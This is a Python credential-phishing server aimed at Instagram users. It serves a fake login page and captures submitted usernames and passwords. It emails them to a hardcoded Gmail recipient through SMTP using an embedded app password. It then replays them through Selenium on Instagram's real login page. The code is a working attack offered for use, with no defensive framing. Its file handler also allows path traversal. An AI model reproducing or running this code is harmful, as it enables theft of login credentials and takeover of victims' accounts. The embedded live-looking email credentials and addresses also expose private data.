from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib.parse
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests
from flask import Flask, render_template, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time


class FakeLoginHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        post_data = urllib.parse.parse_qs(post_data.decode('utf-8'))
        username = post_data.get('username', [''])[0]
        password = post_data.get('password', [''])[0]

        # Send the credentials via email
        self.send_credentials_email(username, password)

        # Perform the login process
        driver = webdriver.Chrome()  # You can use other drivers like Firefox

        # Open the target website
        driver.get("https://www.instagram.com/accounts/login/?hl=en")  # Replace with the actual login URL

        # Locate the username and password fields (using their HTML names or IDs)
        username_field = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, "username")))

# Locate the password field
        password_field = driver.find_element(By.NAME, "password")

        # Fill the fields with your username and password
        username_field.send_keys(username)  # Replace with actual username
        password_field.send_keys(password)  # Replace with actual password

        # Submit the form by simulating pressing the Enter key on the password field
        password_field.send_keys(Keys.RETURN)

        # After submitting, wait for the page to load (you can use time.sleep or WebDriverWait for a better approach)
        time.sleep(3)



    def send_credentials_email(self, username, password):
        # Set up the email server
        sender_email = "yogesh1710200717@gmail.com"  # Your email
        sender_password = "uhpi lfxi emip ngnv"  # Your email password or app password (for Gmail)
        recipient_email = "suryauppili82@gmail.com"  # Email to receive the credentials

        # Compose the email
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = 'Fake Login Credentials'

        body = f"Username: {username}\nPassword: {password}"
        msg.attach(MIMEText(body, 'plain'))

        # Send the email
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()  # Secure the connection
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
            server.close()
            print("Email sent successfully!")

        except Exception as e:
            print(f"Error sending email: {str(e)}")

    def perform_login(self, username, password):
        return True

    def do_GET(self):
        # Set base directory for serving files
        base_dir = os.path.dirname(os.path.abspath(__file__))

        if self.path == '/':
            self.path = '/index.html'

        # Serve files dynamically
        file_path = os.path.join(base_dir, self.path[1:])

        if os.path.exists(file_path):
            self.send_response(200)

            # Set content type
            if self.path.endswith(".html"):
                self.send_header('Content-type', 'text/html')
            elif self.path.endswith(".css"):
                self.send_header('Content-type', 'text/css')
            elif self.path.endswith(".js"):
                self.send_header('Content-type', 'application/javascript')
            elif self.path.endswith(".png") or self.path.endswith(".jpg"):
                self.send_header('Content-type', 'image/png')

            self.end_headers()

            # Read and serve file
            with open(file_path, 'rb') as file:
                self.wfile.write(file.read())

        else:
            self.send_error(404, f'File Not Found: {self.path}')

if __name__ == "__main__":
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, FakeLoginHandler)
    print("Serving on port 8000...")
    httpd.serve_forever()